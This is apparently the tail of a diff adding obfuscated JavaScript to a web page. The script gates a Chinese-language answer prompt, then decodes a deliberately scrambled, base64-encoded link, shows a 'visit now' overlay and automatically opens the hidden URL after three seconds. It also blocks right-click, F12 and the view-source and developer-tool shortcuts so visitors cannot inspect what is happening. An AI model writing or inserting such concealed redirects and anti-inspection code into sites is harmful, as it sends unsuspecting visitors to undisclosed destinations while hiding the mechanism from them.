_0x2acddf=_0x5c0567;_0x5d71af['value'][_0x2acddf(0x190)]()===_0x1cb425['a']?_0x5129c3():(_0x5d71af[_0x2acddf(0x1b8)][_0x2acddf(0x19e)]=_0x2acddf(0x191),_0x5d71af['value']='',_0x5d71af['placeholder']='答案错误，请重试');}_0x2e8895[_0x5c0567(0x1ab)](_0x5c0567(0x1d5),_0x4bf8bd),_0x5d71af[_0x5c0567(0x1ab)]('keypress',function(_0x5d70c4){const _0x336116=_0x5c0567;_0x5d70c4[_0x336116(0x199)]===_0x336116(0x1d6)&&_0x4bf8bd();});}function _0x5129c3(){const _0x35d5b7=_0x4a1d84,_0xcc04b8=document['getElementById'](_0x28a184[_0x35d5b7(0x1c0)]),_0x925aae=document[_0x35d5b7(0x1ac)](_0x35d5b7(0x1b2));if(_0xcc04b8)_0xcc04b8[_0x35d5b7(0x1a5)]();if(_0x925aae)_0x925aae['remove']();_0x92e336();}function _0x92e336(){const _0x379583=_0x4a1d84,_0x5da22f=_0xe31598(_0x28a184['obfuscatedLink']),_0x167293=document[_0x379583(0x1d0)]('div');_0x167293['id']=_0x28a184[_0x379583(0x1b3)],_0x167293['style'][_0x379583(0x194)]='\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20position:\x20fixed;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20top:\x2050%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20left:\x2050%;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20transform:\x20translate(-50%,\x20-50%);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20linear-gradient(135deg,\x20#667eea\x200%,\x20#764ba2\x20100%);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2030px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x2015px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20box-shadow:\x200\x2015px\x2035px\x20rgba(0,0,0,0.2);\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20z-index:\x2010000;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-align:\x20center;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-family:\x20Arial,\x20sans-serif;\x0a\x20\x20\x20\x20\x20\x20\x20\x20',_0x167293[_0x379583(0x1c7)]=_0x379583(0x198)+_0x5da22f+'\x22\x20target=\x22_blank\x22\x20style=\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20display:\x20inline-block;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20background:\x20white;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20color:\x20#667eea;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20padding:\x2015px\x2030px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20border-radius:\x208px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20text-decoration:\x20none;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-weight:\x20bold;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20font-size:\x2016px;\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x22>立即访问</a>\x0a\x20\x20\x20\x20\x20\x20\x20\x20',document['body']['appendChild'](_0x167293),setTimeout(function(){const _0x19fa6c=_0x379583;window[_0x19fa6c(0x192)](_0x5da22f,'_blank'),_0x167293['remove']();},0xbb8);}function _0xe31598(_0x3c2818){const _0x1c4c2e=_0x4a1d84;try{let _0x5441ba='';for(let _0x3fe6e6=0x0;_0x3fe6e6<_0x3c2818[_0x1c4c2e(0x195)];_0x3fe6e6++){(_0x3fe6e6%0x4!==0x0||_0x3fe6e6===0x0)&&(_0x5441ba+=_0x3c2818[_0x3fe6e6]);}const _0x2b418d=_0x5441ba['split']('')[_0x1c4c2e(0x1cd)]()[_0x1c4c2e(0x1b9)](''),_0x4c7bff=atob(_0x2b418d);return _0x4c7bff;}catch(_0x2a75b5){return console['error']('链接解混淆失败:',_0x2a75b5),'#';}}function _0x6a71b4(){const _0x465c1f=_0x4a1d84;document[_0x465c1f(0x1ab)](_0x465c1f(0x1b1),function(_0x1e2e67){const _0x347131=_0x465c1f;_0x1e2e67[_0x347131(0x1c8)]();}),document[_0x465c1f(0x1ab)]('keydown',function(_0x8fc34){const _0x1c23b8=_0x465c1f;(_0x8fc34['key']===_0x1c23b8(0x18b)||_0x8fc34['ctrlKey']&&_0x8fc34['shiftKey']&&_0x8fc34['key']==='I'||_0x8fc34[_0x1c23b8(0x1c1)]&&_0x8fc34['shiftKey']&&_0x8fc34['key']==='C'||_0x8fc34['ctrlKey']&&_0x8fc34['key']==='U')&&_0x8fc34['preventDefault']();});}_0x4168e5();}()));</script>
+</body>
+</html>
